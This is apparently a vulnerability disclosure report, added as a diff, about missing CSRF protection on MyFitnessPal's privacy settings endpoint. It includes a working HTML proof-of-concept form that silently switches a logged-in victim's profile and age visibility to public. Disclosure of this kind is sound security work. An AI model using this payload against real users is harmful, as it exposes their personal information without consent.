@@ -1,0 +1,49 @@
+## Summary:
+Hey team,
+There is no CSRF protection on `Privacy Settings` endpoint "[https://www.myfitnesspal.com/account/profile-privacy](https://www.myfitnesspal.com/account/profile-privacy)"
+As an attacker I could simply send a URL to victim and as soon as he opens the URL his privacy settings would be changed, and I can set his *Profile Visibility* and *Age Visibility* to *Everyone*
+
+## Impact:
+The absence of CSRF (Cross-Site Request Forgery) protection on a site's privacy settings can have serious consequences:
+
+* Unauthorized Privacy Changes: Attackers can force users to unintentionally change their privacy settings, making their profiles and age information visible to everyone.
+
+* Privacy Violations: This vulnerability can lead to unauthorized exposure of sensitive personal information, potentially compromising user privacy.
+
+* Reputation Damage: Users may suffer reputational harm as their private data becomes accessible to anyone without their consent.
+
+* Legal and Compliance Risks: The site could face legal consequences and compliance issues for failing to protect user data and privacy adequately.
+
+* Trust Erosion: Users may lose trust in the platform, impacting its reputation and potentially causing a decline in user engagement and growth.
+
+## Steps to reproduce:
+1. Login in your account
+1. Copy the HTML code and save in a file with .html extension
+1. Open the Html file while you are logged in your account.
+1. You will see your privacy settings will be changed
+
+### HTML CODE:
+```
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF PoC</title>
+  </head>
+  <body>
+    <script>
+      history.pushState('', '', '/');
+    </script>
+    <form action="https://www.myfitnesspal.com/api/services/users" method="POST">
+      <input
+        type="hidden"
+        name="json"
+value='{"item":{"privacy_preferences":{"age_visibility":"public","profile_visibility":"public"}}}'
+      />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
+
+If you have any doubts or queries regarding this report feel free to ask me.
+Best Regards,
